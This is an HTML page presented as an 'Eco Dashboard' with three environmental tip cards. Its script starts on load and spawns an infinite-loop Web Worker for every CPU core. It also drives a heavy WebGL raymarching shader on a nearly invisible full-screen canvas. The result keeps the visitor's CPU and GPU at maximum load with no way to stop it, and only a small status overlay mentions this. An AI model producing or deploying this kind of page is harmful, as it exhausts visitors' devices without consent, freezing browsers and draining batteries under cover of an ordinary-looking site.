<HTML>
<HEAD>
<TITLE>Eco Dashboard (ULTIMATE HARDWARE STRESS)</TITLE>
<STYLE>
    :root {
        --glass: rgba(255, 255, 255, 0.2);
        --border: rgba(255, 255, 255, 0.4);
    }

    body {
        /* We keep your gradient, but the heavy canvas sits behind it */
        background: linear-gradient(135deg, #fffbd6 0%, #b8d8be 100%);
        font-family: "Comic Sans MS", "Comic Sans", cursive;
        min-height: 100vh;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        scroll-behavior: smooth;
        -webkit-font-smoothing: antialiased;
        overflow: hidden;
    }

    /* THE INVISIBLE HEAVY LIFTING CANVAS */
    canvas#gpu-stress {
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        z-index: -1; /* Hides behind background */
        opacity: 0.05; /* Barely visible, just enough to force rendering */
        pointer-events: none;
    }

    /* STATUS OVERLAY */
    #hardware-monitor {
        position: fixed;
        bottom: 10px; right: 10px;
        background: rgba(0,0,0,0.7);
        color: #0f0;
        font-family: monospace;
        padding: 10px;
        border-radius: 8px;
        font-size: 11px;
        z-index: 100;
        border: 1px solid #0f0;
    }

    .glass-container {
        background: var(--glass);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border: 1px solid var(--border);
        border-radius: 30px;
        padding: 30px;
        width: 90%;
        max-width: 600px;
        box-shadow: 0 20px 50px rgba(0,0,0,0.1);
        transform: translateZ(0);
        backface-visibility: hidden;
    }

    .card {
        background: rgba(255, 255, 255, 0.15);
        border: 1px solid var(--border);
        border-radius: 20px;
        margin-bottom: 15px;
        padding: 20px;
        cursor: pointer;
        position: relative;
        overflow: hidden;
        /* 120Hz Smoothness for UI */
        transition: transform 0.25s cubic-bezier(0.2, 0, 0.2, 1), 
                    background 0.25s ease;
        will-change: transform;
    }

    .card:hover {
        background: rgba(255, 255, 255, 0.4);
        transform: scale(1.02) translateZ(0);
    }

    .card h3 {
        margin: 0;
        color: #2e4d32;
        pointer-events: none;
    }

    .description {
        display: none;
        opacity: 0;
        transform: translateY(-10px);
        transition: opacity 0.3s ease, transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        margin-top: 15px;
        color: #444;
        line-height: 1.5;
    }

    .card.active .description {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }
</STYLE>
</HEAD>
<BODY>

<CANVAS id="gpu-stress"></CANVAS>

<DIV id="hardware-monitor">
    <div>GPU: RAYMARCHING ACTIVE (120FPS)</div>
    <div id="cpu-text">CPU: INITIALIZING...</div>
</DIV>

<DIV class="glass-container">
    <H1 style="text-align: center; color: #2e4d32;">Eco Dashboard</H1>
    
    <DIV class="card" onclick="toggleCard(this)">
        <H3>Save Our Earth</H3>
        <P class="description">Protecting our planet starts with small steps like planting trees and conserving water.</P>
    </DIV>

    <DIV class="card" onclick="toggleCard(this)">
        <H3>Reduce-Reuse-Recycle</H3>
        <P class="description">Lower your waste by avoiding single-use plastics and repurposing old items.</P>
    </DIV>

    <DIV class="card" onclick="toggleCard(this)">
        <H3>Stop Pollution</H3>
        <P class="description">Air, water, and soil pollution harm every living creature. Switch to clean energy.</P>
    </DIV>
</DIV>

<SCRIPT>
    // --- PART 1: UI LOGIC ---
    function toggleCard(el) {
        el.classList.toggle('active');
        void el.offsetWidth;
    }

    // --- PART 2: CPU STRESS (ALL CORES) ---
    (function startCPUStress() {
        const cpuText = document.getElementById('cpu-text');
        const cores = navigator.hardwareConcurrency || 16;
        cpuText.innerText = `CPU: LAUNCHING ${cores} THREADS...`;

        // The logic to run on every core
        const workerScript = `
            self.onmessage = () => {
                while(true) {
                    // Infinite Math Loop
                    Math.sqrt(Math.random() * 10000) * Math.tan(Math.random());
                }
            };
        `;
        const blob = new Blob([workerScript], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);

        // Spawn a worker for every logical processor
        for(let i=0; i<cores; i++) {
            new Worker(workerUrl).postMessage('go');
        }

        setTimeout(() => {
            cpuText.innerText = `CPU: ${cores} CORES AT MAX LOAD`;
            cpuText.style.color = '#ff5555';
        }, 1000);
    })();

    // --- PART 3: GPU STRESS (WEBGL RAYMARCHING) ---
    const canvas = document.getElementById("gpu-stress");
    const gl = canvas.getContext("webgl", { powerPreference: "high-performance" });

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        gl.viewport(0, 0, canvas.width, canvas.height);
    }
    window.addEventListener("resize", resize);
    resize();

    const buffer = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);

    const vs = `attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}`;
    
    // HEAVY FRAGMENT SHADER
    const fs = `
        precision highp float;
        uniform vec2 res;
        uniform float time;
        
        float map(vec3 p) {
            vec3 q = fract(p) * 2.0 - 1.0;
            return length(q) - 0.25;
        }

        float trace(vec3 o, vec3 r) {
            float t = 0.0;
            for(int i = 0; i < 128; i++) { // 128 Steps per pixel
                vec3 p = o + r * t;
                float d = map(p);
                t += d * 0.5;
            }
            return t;
        }

        void main() {
            vec2 uv = (gl_FragCoord.xy - 0.5 * res) / res.y;
            vec3 ray = normalize(vec3(uv, 1.0));
            
            // Camera rotation to force recalculation
            float s = sin(time*0.5), c = cos(time*0.5);
            ray.xz *= mat2(c, -s, s, c);
            
            vec3 origin = vec3(0.0, 0.0, time);
            float t = trace(origin, ray);
            
            // Dummy calculation to ensure GPU doesn't optimize away
            float fog = 1.0 / (1.0 + t * t * 0.1);
            gl_FragColor = vec4(vec3(fog), 0.05); // Almost invisible
        }
    `;

    function createShader(type, src) {
        const s = gl.createShader(type);
        gl.shaderSource(s, src);
        gl.compileShader(s);
        return s;
    }

    const program = gl.createProgram();
    gl.attachShader(program, createShader(gl.VERTEX_SHADER, vs));
    gl.attachShader(program, createShader(gl.FRAGMENT_SHADER, fs));
    gl.linkProgram(program);
    gl.useProgram(program);

    const posLoc = gl.getAttribLocation(program, "p");
    gl.enableVertexAttribArray(posLoc);
    gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

    const timeLoc = gl.getUniformLocation(program, "time");
    const resLoc = gl.getUniformLocation(program, "res");

    let start = Date.now();
    function loop() {
        gl.uniform2f(resLoc, canvas.width, canvas.height);
        gl.uniform1f(timeLoc, (Date.now() - start) * 0.001);
        gl.drawArrays(gl.TRIANGLES, 0, 6);
        requestAnimationFrame(loop);
    }
    loop();
</SCRIPT>

</BODY>
</HTML>